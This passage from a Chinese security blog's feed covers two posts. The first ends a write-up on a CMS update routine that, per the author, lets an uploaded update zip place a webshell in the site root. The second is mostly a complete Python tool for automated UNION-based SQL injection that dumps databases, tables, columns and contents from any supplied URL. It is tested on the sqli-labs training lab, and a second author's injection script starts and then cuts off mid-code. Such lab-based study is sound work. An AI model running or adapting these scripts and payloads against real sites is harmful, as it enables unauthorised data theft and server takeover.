class="keyword">$this</span>-&gt;lib(<span class="string">'file'</span>)-&gt;mv($value,<span class="keyword">$this</span>-&gt;dir_root.$tmp);</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>(is_dir($value) &amp;&amp; !is_dir(<span class="keyword">$this</span>-&gt;dir_root.$tmp))&#123;<span class="comment">//如果tmp目录不存在，就在根目录下生成文件或目录</span></div><div class="line">                <span class="keyword">$this</span>-&gt;lib(<span class="string">'file'</span>)-&gt;make(<span class="keyword">$this</span>-&gt;dir_root.$tmp,<span class="string">'folder'</span>);</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">//现在执行删除</span></div><div class="line">        <span class="keyword">if</span>($delfile)&#123;</div><div class="line">            $dlist = file($delfile);</div><div class="line">            <span class="keyword">if</span>(!$dlist)&#123;</div><div class="line">                $dlist = <span class="keyword">array</span>();</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">foreach</span>($dlist <span class="keyword">AS</span> $key=&gt;$value)&#123;</div><div class="line">                <span class="keyword">if</span>(!$value &amp;&amp; !trim($value))&#123;</div><div class="line">                    <span class="keyword">continue</span>;</div><div class="line">                &#125;</div><div class="line">                $value = trim($value);</div><div class="line">                <span class="keyword">if</span>($value &amp;&amp; is_file(<span class="keyword">$this</span>-&gt;dir_root.$value))&#123;</div><div class="line">                    <span class="keyword">$this</span>-&gt;lib(<span class="string">'file'</span>)-&gt;rm(<span class="keyword">$this</span>-&gt;dir_root.$value);</div><div class="line">                    <span class="keyword">continue</span>;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span>($value &amp;&amp; is_dir(<span class="keyword">$this</span>-&gt;dir_root.$value))&#123;</div><div class="line">                    <span class="keyword">$this</span>-&gt;lib(<span class="string">'file'</span>)-&gt;rm(<span class="keyword">$this</span>-&gt;dir_root.$value,<span class="string">'folder'</span>);</div><div class="line">                    <span class="keyword">continue</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">//执行table.sql操作</span></div><div class="line">        <span class="keyword">$this</span>-&gt;update_table();</div><div class="line">        <span class="comment">//执行新的扩展</span></div><div class="line">        <span class="keyword">foreach</span>($sqlfile <span class="keyword">AS</span> $key=&gt;$value)&#123;</div><div class="line">            <span class="keyword">if</span>(!$value || !is_file($value))&#123;</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line">            $info = trim(file_get_contents($value));</div><div class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;db-&gt;prefix != <span class="string">'qinggan_'</span>)&#123;</div><div class="line">                $info = str_replace(<span class="string">'qinggan_'</span>,<span class="keyword">$this</span>-&gt;db-&gt;prefix,$info);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>($info)&#123;</div><div class="line">                <span class="keyword">$this</span>-&gt;sql_run($info);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">//更新配置文件</span></div><div class="line">        <span class="keyword">foreach</span>($cfile <span class="keyword">AS</span> $key=&gt;$value)&#123;</div><div class="line">            $base = basename($value);</div><div class="line">            <span class="keyword">$this</span>-&gt;lib(<span class="string">'file'</span>)-&gt;mv($value,<span class="keyword">$this</span>-&gt;dir_phpok.<span class="string">'config/'</span>.$base);</div><div class="line">        &#125;</div><div class="line">        <span class="comment">//运行PHP文件，以实现高级的PHP更新操作</span></div><div class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;dir_root.<span class="string">"data/update/run.php"</span>))&#123;</div><div class="line">            <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;dir_root.<span class="string">'data/update/run.php'</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">$this</span>-&gt;lib(<span class="string">'file'</span>)-&gt;rm(<span class="keyword">$this</span>-&gt;dir_root.<span class="string">'data/update/'</span>);</div><div class="line">        $list = <span class="keyword">$this</span>-&gt;lib(<span class="string">'file'</span>)-&gt;ls(<span class="keyword">$this</span>-&gt;dir_root.<span class="string">'data/update/'</span>);</div><div class="line">        <span class="keyword">if</span>($list &amp;&amp; count($list)&gt;<span class="number">0</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">foreach</span>($list <span class="keyword">as</span> $key=&gt;$value)&#123;</div><div class="line">                <span class="keyword">$this</span>-&gt;lib(<span class="string">'file'</span>)-&gt;rm($value,<span class="string">'folder'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">//更新升级文件</span></div><div class="line">        <span class="keyword">$this</span>-&gt;success_version($verinfo);</div><div class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'status'</span>=&gt;<span class="string">'ok'</span>,<span class="string">'content'</span>=&gt;P_Lang(<span class="string">'升级成功'</span>));</div><div class="line">    &#125;</div></pre></td></tr></table></figure><p>利用方式一就是通过上传不存在的更新zip，来使更新的内容（webshell）被放入根目录。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个是夏令营师傅现场审计的一个0day，但是感觉这个cms很小众，直接利用这个漏洞的话会感觉很鸡肋，毕竟先要进后台。但是getshell的思路很nice。&lt;br&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://whc.dropsec.xyz/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞复现" scheme="http://whc.dropsec.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="渗透测试" scheme="http://whc.dropsec.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>简单的数字型sql注入伪自动化脚本</title>
    <link href="http://whc.dropsec.xyz/2017/07/19/%E7%AE%80%E5%8D%95%E7%9A%84%E6%95%B0%E5%AD%97%E5%9E%8Bsql%E6%B3%A8%E5%85%A5%E4%BC%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC/"/>
    <id>http://whc.dropsec.xyz/2017/07/19/简单的数字型sql注入伪自动化脚本/</id>
    <published>2017-07-19T10:05:38.000Z</published>
    <updated>2017-07-19T10:33:42.942Z</updated>
    
    <content type="html"><![CDATA[<p>暑假在充实自己的时候，忙里偷闲（熬夜）写的一个针对简单的数字型注入的伪自动化脚本，道行尚浅，下面是我写的，然后再放一个大佬写的字符型和数字型都可以的 </p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*-coding:utf-8-*-</span></div><div class="line"><span class="comment"># author:ha1g0</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line">guess=string.lowercase + string.uppercase + string.digits</div><div class="line"><span class="comment"># url = "http://10.0.0.121/guestbook/show_msg.php?id=71"</span></div><div class="line">url = <span class="string">"http://localhost/sqli-labs-master/Less-2/index.php?id=1"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">orderby</span><span class="params">(url)</span>:</span><span class="comment">#返回select语句查询的列数</span></div><div class="line">    test = <span class="string">u" order by "</span></div><div class="line">    raw_req = requests.get(url)</div><div class="line">    raw_len = len(raw_req.text)</div><div class="line">    <span class="comment"># with open(r'F:/Programming/Python/Python test/test/1.txt','w') as raw_f:</span></div><div class="line">    <span class="comment"># raw_f.write(raw_req.text)</span></div><div class="line">    <span class="comment"># raw_f.close()</span></div><div class="line">    different = []</div><div class="line">    j = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</div><div class="line">        testurl = url + test + str(i)</div><div class="line">        <span class="comment"># print testurl</span></div><div class="line">        test_req = requests.get(testurl)</div><div class="line">        test_len = len(test_req.text)</div><div class="line">        different.append([i, raw_len - test_len])</div><div class="line">        rang = different[i - <span class="number">1</span>]</div><div class="line">        <span class="keyword">if</span> rang[<span class="number">1</span>] != <span class="number">0</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">    number = len(different) - <span class="number">1</span></div><div class="line">    <span class="keyword">return</span> number</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">column_number</span><span class="params">(url, id)</span>:</span><span class="comment">#返回的是可以回显内容的字段number列表</span></div><div class="line">    url1 = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, orderby(url)):</div><div class="line">        testurl = url.strip(<span class="string">"id=%d"</span> % id) + <span class="string">"id=-1 union select "</span></div><div class="line">        url1 += str(i) + <span class="string">","</span></div><div class="line">    testurl = testurl + url1 + str(orderby(url))</div><div class="line">    <span class="comment"># print testurl</span></div><div class="line">    req = requests.get(testurl)</div><div class="line">    html = req.text</div><div class="line">    soup = BeautifulSoup(html,<span class="string">"html.parser"</span>)</div><div class="line">    string = soup.get_text().encode(<span class="string">"utf8"</span>)</div><div class="line">    echo_number = re.findall(<span class="string">r'(\w*[0-9]+)\w*'</span>,string)</div><div class="line">    column_echo_number1 = list(set(echo_number))<span class="comment">#去重</span></div><div class="line">    <span class="comment"># column_echo_number2=[]</span></div><div class="line">    <span class="comment"># asscii_string = lambda s: ''.join(map(lambda c: "%02X" % ord(c), s))#把字符串转换成ascii的 16进制</span></div><div class="line">    <span class="comment"># start_num = int(asscii_string("0"))</span></div><div class="line">    <span class="comment"># end_num = int(asscii_string(str(orderby(url))))</span></div><div class="line">    <span class="comment"># print start_num,end_num</span></div><div class="line">    <span class="comment"># for j in column_echo_number1:</span></div><div class="line">    <span class="comment">#     if int(asscii_string(j)) in range(start_num,end_num):</span></div><div class="line">    <span class="comment">#         print j</span></div><div class="line">    <span class="comment">#         column_echo_number2.append(column_echo_number1[j])</span></div><div class="line">    <span class="keyword">return</span> column_echo_number1</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">union_injection_database</span><span class="params">(url,id,option)</span>:</span><span class="comment">#返回含有数据库名的列表</span></div><div class="line">    <span class="comment"># database = ""</span></div><div class="line">    <span class="comment"># for i in range(1,11):</span></div><div class="line">    <span class="comment">#     try:</span></div><div class="line">    <span class="comment">#         for str in guess:</span></div><div class="line">    <span class="comment">#             str = ord(str)</span></div><div class="line">    <span class="comment">#             starttime = time.time()</span></div><div class="line">    <span class="comment">#             header = &#123;</span></div><div class="line">    <span class="comment">#                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36'&#125;</span></div><div class="line">    <span class="comment">#             data = u" and If(ascii(substr(database(),%d,1))=%s,sleep(2),1)--+" % (i, str)</span></div><div class="line">    <span class="comment">#             requrl = url + data</span></div><div class="line">    <span class="comment">#             req = requests.get(requrl, headers=header)</span></div><div class="line">    <span class="comment">#             s = time.time() - starttime</span></div><div class="line">    <span class="comment">#             if s &gt; 1:</span></div><div class="line">    <span class="comment">#                 string = chr(str)</span></div><div class="line">    <span class="comment">#                 database += string</span></div><div class="line">    <span class="comment">#     except:</span></div><div class="line">    <span class="comment">#         pass</span></div><div class="line">    <span class="comment"># return  database</span></div><div class="line">    url1 = <span class="string">""</span></div><div class="line">    testurl = url.strip(<span class="string">"id=%d"</span> % id) + <span class="string">"id=-1 union select "</span></div><div class="line">    <span class="keyword">if</span> option ==<span class="string">"current"</span>:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, orderby(url)):</div><div class="line">            <span class="keyword">if</span> str(i) <span class="keyword">in</span> column_number(url,id):</div><div class="line">                url1 += <span class="string">"group_concat(0x28,database(),0x29)"</span>+ <span class="string">","</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                url1 +=str(i)+<span class="string">","</span></div><div class="line">        testurl = testurl + url1 + str(orderby(url))</div><div class="line">    <span class="keyword">elif</span> option ==<span class="string">"all"</span>:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, orderby(url)):</div><div class="line">            <span class="keyword">if</span> str(i) <span class="keyword">in</span> column_number(url, id):</div><div class="line">                url1 +=<span class="string">"group_concat(0x28,schema_name,0x29)"</span>+<span class="string">","</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                url1 +=str(i)+<span class="string">","</span></div><div class="line">        testurl= testurl +url1 +str(orderby(url))+<span class="string">" from information_schema.schemata"</span></div><div class="line">    <span class="comment"># print testurl</span></div><div class="line">    req = requests.get(testurl)</div><div class="line">    html = req.text</div><div class="line">    soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)</div><div class="line">    string = soup.get_text().encode(<span class="string">"utf8"</span>)</div><div class="line">    pstring = re.sub(<span class="string">'[^a-zA-Z()_0-9]'</span>,<span class="string">''</span>,string)</div><div class="line">    <span class="comment"># print pstring</span></div><div class="line">    a = re.findall(<span class="string">ur"[^(（]+(?=[)）])"</span>,pstring)</div><div class="line">    a = list(set(a))</div><div class="line">    <span class="keyword">return</span> a</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">union_injection_table</span><span class="params">(url,id,database_name)</span>:</span><span class="comment">#返回指定数据库下的表名</span></div><div class="line">    url1 = <span class="string">""</span></div><div class="line">    testurl = url.strip(<span class="string">"id=%d"</span> % id) + <span class="string">"id=-1 union select "</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, orderby(url)):</div><div class="line">        <span class="keyword">if</span> str(i) <span class="keyword">in</span> column_number(url, id):</div><div class="line">            url1 +=<span class="string">"group_concat(0x28,table_name,0x29)"</span>+<span class="string">","</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            url1 +=str(i)+<span class="string">","</span></div><div class="line">    testurl= testurl +url1 +str(orderby(url))+<span class="string">" from information_schema.tables where table_schema='%s'"</span>%database_name</div><div class="line">    <span class="comment"># print testurl</span></div><div class="line">    req = requests.get(testurl)</div><div class="line">    html = req.text</div><div class="line">    soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)</div><div class="line">    string = soup.get_text().encode(<span class="string">"utf8"</span>)</div><div class="line">    pstring = re.sub(<span class="string">'[^a-zA-Z()_0-9]'</span>,<span class="string">''</span>,string)</div><div class="line">    <span class="comment"># print pstring</span></div><div class="line">    a = re.findall(<span class="string">ur"[^(（]+(?=[)）])"</span>,pstring)</div><div class="line">    <span class="comment"># print  a</span></div><div class="line">    <span class="keyword">return</span> a </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">union_injection_column</span><span class="params">(url,id,tablename)</span>:</span><span class="comment">#返回指定表的列名</span></div><div class="line">    url1 = <span class="string">""</span></div><div class="line">    testurl = url.strip(<span class="string">"id=%d"</span> % id) + <span class="string">"id=-1 union select "</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, orderby(url)):</div><div class="line">        <span class="keyword">if</span> str(i) <span class="keyword">in</span> column_number(url, id):</div><div class="line">            url1 +=<span class="string">"group_concat(0x28,column_name,0x29)"</span>+<span class="string">","</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            url1 +=str(i)+<span class="string">","</span></div><div class="line">    testurl= testurl +url1 +str(orderby(url))+<span class="string">" from information_schema.columns where table_name='%s'"</span>%tablename</div><div class="line">    <span class="comment"># print testurl</span></div><div class="line">    req = requests.get(testurl)</div><div class="line">    html = req.text</div><div class="line">    soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)</div><div class="line">    string = soup.get_text().encode(<span class="string">"utf8"</span>)</div><div class="line">    pstring = re.sub(<span class="string">'[^a-zA-Z()_0-9]'</span>,<span class="string">''</span>,string)</div><div class="line">    <span class="comment"># print pstring</span></div><div class="line">    a = re.findall(<span class="string">ur"[^(（]+(?=[)）])"</span>,pstring)</div><div class="line">    <span class="comment"># print  a</span></div><div class="line">    <span class="keyword">return</span> a </div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">union_injection_content</span><span class="params">(url,id,tablename,column)</span>:</span><span class="comment">#返回指定列名的内容</span></div><div class="line">    url1 = <span class="string">""</span></div><div class="line">    testurl = url.strip(<span class="string">"id=%d"</span> % id) + <span class="string">"id=-1 union select "</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, orderby(url)):</div><div class="line">        <span class="keyword">if</span> str(i) <span class="keyword">in</span> column_number(url, id):</div><div class="line">            url1 +=<span class="string">"group_concat(0x28,%s,0x29)"</span>%column+<span class="string">","</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            url1 +=str(i)+<span class="string">","</span></div><div class="line">    testurl= testurl +url1 +str(orderby(url))+<span class="string">" from %s"</span>%tablename</div><div class="line">    <span class="comment"># print testurl</span></div><div class="line">    req = requests.get(testurl)</div><div class="line">    html = req.text</div><div class="line">    soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)</div><div class="line">    string = soup.get_text().encode(<span class="string">"utf8"</span>)</div><div class="line">    pstring = re.sub(<span class="string">'[^a-zA-Z()@._0-9]'</span>,<span class="string">''</span>,string)</div><div class="line">    <span class="comment"># print pstring</span></div><div class="line">    a = re.findall(<span class="string">ur"[^(（]+(?=[)）])"</span>,pstring)</div><div class="line">    <span class="comment"># print  a</span></div><div class="line">    <span class="keyword">return</span> a </div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    <span class="comment"># print column_number(url,71)</span></div><div class="line">    id= raw_input(<span class="string">"id:"</span>)</div><div class="line">    id =int(id)</div><div class="line">    current_databse =str(list(union_injection_database(url, id,<span class="string">"current"</span>))[<span class="number">0</span>])</div><div class="line">    <span class="keyword">print</span> <span class="string">"current_database:"</span>,current_databse</div><div class="line">    <span class="keyword">print</span> <span class="string">"the tables of current_database:"</span></div><div class="line">    <span class="keyword">print</span> union_injection_table(url, id,current_databse)</div><div class="line">    tablename = raw_input(<span class="string">"table:"</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"the name of column:"</span></div><div class="line">    <span class="keyword">print</span> union_injection_column(url, id, tablename)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> union_injection_column(url,id,tablename):</div><div class="line">        flag = raw_input(<span class="string">"do you want to get the content of column(y/n)"</span>)</div><div class="line">        <span class="keyword">if</span> flag ==<span class="string">"y"</span>:</div><div class="line">            column_name=raw_input(<span class="string">"column_name:"</span>)</div><div class="line">            <span class="keyword">print</span> union_injection_content(url, id,tablename,column_name)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">"break"</span></div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure><p>简单的union注入，判断order by字段数，通过html的变化来找到字段数（把order by 2及其以后的html跟order by 1 的html进行比较，标记出现不同的包，取这个包对应数字-1，这个数字就是order by 字段数）。<br>判断select可以回显注入语句的判断点的函数，这个地方我就卡住了，然后师傅就给了一个思路，注入语句前后2侧放个标识符，然后通过正则，匹配标识符内的内容（diao爆了），然后下面的爆库，爆表等等的内容就只是payload的组合问题了。</p><p>当然光给脚本，不给出结果图是没有说服力的，我就用sqllab的less2来做靶场，试试我这个脚本<br><img src="https://ws1.sinaimg.cn/large/00699yRSly1fhpdgeirqwj30qr0jz74x.jpg" alt=""></p><p>id是输入的URL后面的id数，有的页面会一个id数，一个页面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="keyword">import</span> hackhttp</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</div><div class="line"><span class="keyword">from</span> prettytable <span class="keyword">import</span> PrettyTable</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">urlencode</span><span class="params">(string)</span>:</span></div><div class="line">    <span class="string">'''对相关字符进行url编码，这里使用的是替换'''</span></div><div class="line">    string = string.replace(<span class="string">" "</span>, <span class="string">"%20"</span>) <span class="comment"># 空格</span></div><div class="line">    string = string.replace(<span class="string">"'"</span>, <span class="string">"%27"</span>) <span class="comment"># 单引号</span></div><div class="line">    string = string.replace(<span class="string">"#"</span>, <span class="string">"%23"</span>) <span class="comment"># #号</span></div><div class="line">    <span class="keyword">return</span> string</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTML</span><span class="params">(target)</span>:</span></div><div class="line">    <span class="string">'''获取指定连接的html代码,使用的是hackhttp'''</span></div><div class="line">    hh = hackhttp.hackhttp()</div><div class="line">    _, _, html, _, _ = hh.http(target)</div><div class="line">    <span class="keyword">return</span> html</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreateSelect</span><span class="params">(Colnum)</span>:</span></div><div class="line">    <span class="string">'''根据字段长度创建select payload，类似于select 1,2,3……'''</span></div><div class="line">    payload = <span class="string">"and 9999=9998 union select "</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, Colnum + <span class="number">1</span>):</div><div class="line">        <span class="keyword">if</span> Colnum == i: <span class="comment"># 如果是最大数，末尾不应当有,</span></div><div class="line">            payload += <span class="string">"&#123;&#125;"</span>.format(i)</div><div class="line">        <span class="keyword">else</span>:              <span class="comment"># 如果是中间，末尾应当有,</span></div><div class="line">            payload += <span class="string">"&#123;&#125;,"</span>.format(i)</div><div class="line">    <span class="keyword">return</span> payload</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">replacePosition</span><span class="params">(payload, position, inje)</span>:</span></div><div class="line">    <span class="string">'''替换回显位'''</span></div><div class="line">    rep = <span class="string">"concat(0x7B7B7B7B7B7B,group_concat(&#123;&#125;),0x7D7D7D7D7D7D)"</span>.format(inje) <span class="comment"># 前后加上标志位</span></div><div class="line">    ret = payload.replace(position, rep)</div><div class="line">    <span class="keyword">return</span> ret</div><div class="line">&#123;&#123;&#123;&#123;&#123;&#123;xxxxx&#125;&#125;&#125;&#125;&#125;&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreatePayload</span><span class="params">(url, payload, p_type = <span class="number">0</span>)</span>:</span></div><div class="line">    <span class="string">'''根据注入类型来创建最终payload'''</span></div><div class="line">    <span class="keyword">if</span> p_type == <span class="number">0</span>: <span 